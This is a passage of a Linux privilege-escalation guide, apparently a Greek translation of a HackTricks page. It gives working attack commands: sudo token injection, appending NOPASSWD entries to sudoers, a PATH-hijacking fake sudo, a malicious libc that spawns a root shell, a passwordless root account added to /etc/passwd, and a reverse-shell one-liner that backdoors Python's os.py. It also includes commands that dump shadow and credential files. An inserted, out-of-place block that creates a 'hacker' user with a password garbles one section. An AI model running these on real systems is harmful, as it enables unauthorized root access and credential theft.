(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στον root με setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Το **τρίτο exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα sudoers file** που **καθιστά τα sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Αν έχετε **write permissions** στο φάκελο ή σε οποιοδήποτε από τα αρχεία που δημιουργούνται μέσα σε αυτόν μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε sudo privileges** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό, κάνοντας:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` καθορίζουν ποιος μπορεί να χρησιμοποιήσει το `sudo` και με ποιον τρόπο. Αυτά τα αρχεία **εξ ορισμού μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
**Εάν** μπορείτε να **διαβάσετε** αυτό το αρχείο μπορεί να καταφέρετε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, και εάν μπορείτε να **γράψετε** οποιοδήποτε αρχείο θα μπορέσετε να **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Αν μπορείς να γράψεις, μπορείς να καταχραστείς αυτή την άδεια.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Ένας άλλος τρόπος κατάχρησης αυτών των δικαιωμάτων:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Υπάρχουν μερικές εναλλακτικές για το εκτελέσιμο `sudo`, όπως το `doas` για OpenBSD. Θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Εάν γνωρίζετε ότι ένας **χρήστης συνήθως συνδέεται σε μια μηχανή και χρησιμοποιεί `sudo`** για να αυξήσει τα δικαιώματα και έχετε ένα shell στο πλαίσιο αυτού του χρήστη, μπορείτε να **δημιουργήσετε ένα νέο sudo executable** που θα εκτελέσει τον κώδικά σας ως root και κατόπιν την εντολή του χρήστη. Έπειτα, **τροποποιήστε το $PATH** του περιβάλλοντος του χρήστη (για παράδειγμα προσθέτοντας το νέο path στο .bash_profile) ώστε όταν ο χρήστης εκτελεί sudo, να εκτελείται το sudo executable σας.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash) θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε το νέο path. Για παράδειγμα[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτελώντας κάτι σαν:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Κοινή Βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία ρυθμίσεων**. Συνήθως, αυτό το αρχείο περιέχει την εξής διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία ρυθμίσεων από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία ρυθμίσεων **δείχνουν σε άλλους φακέλους** όπου πρόκειται να **αναζητηθούν** **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που αναφέρονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα σε `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που αναφέρεται στο config αρχείο μέσα σε `/etc/ld.so.conf.d/*.conf`, ενδέχεται να μπορεί να αποκτήσει αυξημένα προνόμια.\
Ρίξτε μια ματιά στο **πώς να εκμεταλλευτείτε αυτή την εσφαλμένη διαμόρφωση** στην ακόλουθη σελίδα:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Με την αντιγραφή της lib στο `/var/tmp/flag15/` θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Οι Linux capabilities παρέχουν ένα **υποσύνολο των διαθέσιμων root προνομίων σε μια διεργασία**. Αυτό ουσιαστικά διασπά τα root **προνόμια σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο μειώνεται το πλήρες σύνολο προνομίων, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με capabilities και πώς να τις εκμεταλλευτείτε**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Σε έναν κατάλογο, το **bit για "execute"** υποδηλώνει ότι ο χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
Το **"read"** bit υποδηλώνει ότι ο χρήστης μπορεί να απαριθμήσει τα αρχεία, και το **"write"** bit υποδηλώνει ότι ο χρήστης μπορεί να διαγράψει και να δημιουργήσει νέα αρχεία.

## ACLs

Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, ικανό να **υπερισχύει των παραδοσιακών ugo/rwx permissions**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο πρόσβασης σε αρχείο ή κατάλογο επιτρέποντας ή απορρίπτοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** τον χρήστη "kali" read και write permissions πάνω σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λήψη** αρχείων με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ανοιχτές shell συνεδρίες

Σε **παλιότερες εκδόσεις** μπορείς να **hijack** κάποια **shell** συνεδρία διαφορετικού χρήστη (**root**).\
Σε **νεότερες εκδόσεις** θα μπορείς να **connect** σε screen sessions μόνο του **δικού σου χρήστη**. Ωστόσο, μπορείς να βρεις **ενδιαφέροντα στοιχεία μέσα στη συνεδρία**.

### screen sessions hijacking

**Εμφάνιση screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Σύνδεση σε session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux υποκλοπή συνεδριών

Αυτό ήταν ένα πρόβλημα με τις **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να υποκλέψω μια συνεδρία tmux (v2.1) που είχε δημιουργηθεί από τον root ως χρήστης χωρίς προνόμια.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Σύνδεση σε συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα SSL και SSH keys που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, etc) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 ενδέχεται να επηρεαστούν από αυτό το bug.\
Το bug προκαλείται κατά τη δημιουργία ενός νέου ssh key σε αυτά τα OS, καθώς **μόνο 32,768 παραλλαγές ήταν δυνατές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το ssh public key μπορείτε να αναζητήσετε το αντίστοιχο private key**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ενδιαφέρουσες τιμές διαμόρφωσης

- **PasswordAuthentication:** Προσδιορίζει αν επιτρέπεται το password authentication. Η προεπιλογή είναι `no`.
- **PubkeyAuthentication:** Προσδιορίζει αν επιτρέπεται το public key authentication. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν το password authentication επιτρέπεται, καθορίζει αν ο server επιτρέπει σύνδεση σε λογαριασμούς με κενές συμβολοσειρές password. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh, η προεπιλεγμένη τιμή είναι `no`. Πιθανές τιμές:

- `yes`: ο root μπορεί να συνδεθεί με password και private key
- `without-password` or `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με private key
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με private key και αν έχουν καθοριστεί οι επιλογές commands
- `no` : όχι

### AuthorizedKeysFile

Καθορίζει αρχεία που περιέχουν τα public keys που μπορούν να χρησιμοποιηθούν για user authentication. Μπορεί να περιέχει tokens όπως `%h`, τα οποία θα αντικατασταθούν από το home directory. **Μπορείτε να υποδείξετε absolute paths** (ξεκινώντας από `/`) ή **relative paths από το home του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Αυτή η ρύθμιση θα υποδείξει ότι αν προσπαθήσετε να συνδεθείτε με το **private** κλειδί του χρήστη "**testusername**", το ssh θα συγκρίνει το public κλειδί του κλειδιού σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Το SSH agent forwarding σας επιτρέπει να **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. Έτσι, θα μπορείτε να **jump** via ssh **to a host** και από εκεί **jump to another** host **using** το **key** located in your **initial host**.

Πρέπει να ορίσετε αυτήν την επιλογή στο `$HOME/.ssh.config` ως εξής:
```
Host example.com
ForwardAgent yes
```
Σημειώστε ότι αν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, αυτός ο host θα μπορεί να έχει πρόσβαση στα κλειδιά (κάτι που αποτελεί ζήτημα ασφάλειας).

Το αρχείο `/etc/ssh_config` μπορεί να **παρακάμψει** αυτές τις **επιλογές** και να επιτρέψει ή να απορρίψει αυτήν τη διαμόρφωση.\
Το αρχείο `/etc/sshd_config` μπορεί να **επιτρέψει** ή να **απαγορεύσει** το ssh-agent forwarding με τη λέξη-κλειδί `AllowAgentForwarding` (default is allow).

Εάν διαπιστώσετε ότι το Forward Agent είναι ρυθμισμένο σε ένα περιβάλλον, διαβάστε την παρακάτω σελίδα καθώς **ενδέχεται να μπορείτε να το καταχραστείτε για να αποκτήσετε αυξημένα προνόμια**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Σημαντικά αρχεία

### Profile αρχεία

Το αρχείο `/etc/profile` και τα αρχεία κάτω από το `/etc/profile.d/` είναι **scripts που εκτελούνται όταν ένας χρήστης ανοίγει ένα νέο shell**. Επομένως, αν μπορείτε να **γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να αποκτήσετε αυξημένα προνόμια**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Αν βρεθεί κάποιο περίεργο script προφίλ, πρέπει να το ελέγξετε για **ευαίσθητες λεπτομέρειες**.

### Passwd/Shadow Files

Ανάλογα με το OS, τα `/etc/passwd` και `/etc/shadow` αρχεία μπορεί να έχουν διαφορετικό όνομα ή να υπάρχει αντίγραφο ασφαλείας. Επομένως συνιστάται να **τα βρείτε όλα** και να **ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **εάν υπάρχουν hashes** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **password hashes** μέσα στο αρχείο `/etc/passwd` (ή ισοδύναμο)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιούργησε ένα password με μία από τις ακόλουθες εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
## Προσθήκη χρήστη `hacker` και ρύθμιση κωδικού

Για να δημιουργήσετε τον χρήστη `hacker` και να ορίσετε έναν κωδικό πρόσβασης, εκτελέστε τα παρακάτω (ο κωδικός που δημιουργήθηκε είναι: `pR7$9vLq2Xb!`). Αποθηκεύστε τον με ασφάλεια.

```bash
# Δημιουργία χρήστη με home directory και bash shell
sudo useradd -m -s /bin/bash hacker

# Ορισμός κωδικού (χρησιμοποιήστε τον παρακάτω ή παραμετροποιήστε)
echo "hacker:pR7$9vLq2Xb!" | sudo chpasswd

# Προαιρετικά: αναγκάστε αλλαγή κωδικού στην πρώτη είσοδο
sudo passwd -e hacker
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Τώρα μπορείτε να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε έναν ψεύτικο χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: μπορεί να υποβαθμίσει την τρέχουσα ασφάλεια του μηχανήματος.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ΣΗΜΕΙΩΣΗ: Σε πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Πρέπει να ελέγξετε αν μπορείτε να **γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **service configuration file**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή εκτελεί έναν **tomcat** server και μπορείτε να **τροποποιήσετε το αρχείο διαμόρφωσης της υπηρεσίας Tomcat μέσα στο /etc/systemd/,** τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενη τοποθεσία/Owned αρχεία
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία των τελευταίων λεπτών
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ψάχνει για **πολλαπλά πιθανά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα ακόμα ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοιχτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών πρόσβασης αποθηκευμένων σε τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείτε να διαβάσετε logs, ενδέχεται να μπορέσετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα τους**. Όσο πιο περίεργο είναι το log, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, κάποια **"bad"** configured (backdoored?) **audit logs** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα σε audit logs όπως εξηγείται σε αυτό το άρθρο: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε logs, η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα σας φανεί πολύ χρήσιμη.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Θα πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή regexps για hashes.\
Δεν πρόκειται να απαριθμήσω εδώ πώς να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζετε από **πού** θα εκτελεστεί ένα python script και μπορείτε να **γράψετε μέσα** σε εκείνο το φάκελο ή μπορείτε να **τροποποιήσετε python libraries**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη os και να την backdoor (αν μπορείτε να γράψετε στο σημείο όπου θα εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλά προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να χειραγωγηθεί ώστε να εκτελέσει αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο σε _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται η περιστροφή των αρχείων καταγραφής.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει την έκδοση `logrotate` `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτή τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε κάθε φορά που διαπιστώνετε ότι μπορείτε να τροποποιήσετε τα logs, ελέγξτε ποιος διαχειρίζεται αυτά τα logs και δείτε αν μπορείτε να ανεβάσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα `ifcf-<whatever>` script στο _/etc/sysconfig/network-scripts_ **ή** να **τροποποιήσει** ένα υπάρχον, τότε το **σύστημά σας είναι pwned**.

Τα network scripts, _ifcg-eth0_ για παράδειγμα, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, αυτά είναι \~sourced\~ στο Linux από το Network Manager (dispatcher.d).

Στη δική μου περίπτωση, η τιμή `NAME=` σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν υπάρχει **κενό χαρακτήρα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το κενό**. Αυτό σημαίνει ότι **ό,τιδήποτε μετά το πρώτο κενό εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημειώστε το κενό διάστημα μεταξύ Network και /bin/id_)

### **init, init.d, systemd, και rc.d**

Ο κατάλογος `/etc/init.d` περιέχει **σενάρια** για System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει σενάρια για `start`, `stop`, `restart` και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή στα συστήματα Redhat είναι το `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` συνδέεται με το **Upstart**, ένα νεότερο σύστημα **διαχείρισης υπηρεσιών** που εισήγαγε η Ubuntu, το οποίο χρησιμοποιεί αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα σενάρια SysVinit εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις Upstart λόγω ενός στρώματος συμβατότητας στο Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος διαχειριστής εκκίνησης και υπηρεσιών, προσφέροντας προηγμένες δυνατότητες όπως εκκίνηση daemon κατά ζήτηση, διαχείριση automount και στιγμιότυπα κατάστασης συστήματος. Οργανώνει αρχεία σε `/usr/lib/systemd/` για πακέτα διανομής και `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, απλοποιώντας τη διαδικασία διαχείρισης συστήματος.

## Άλλα κόλπα

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

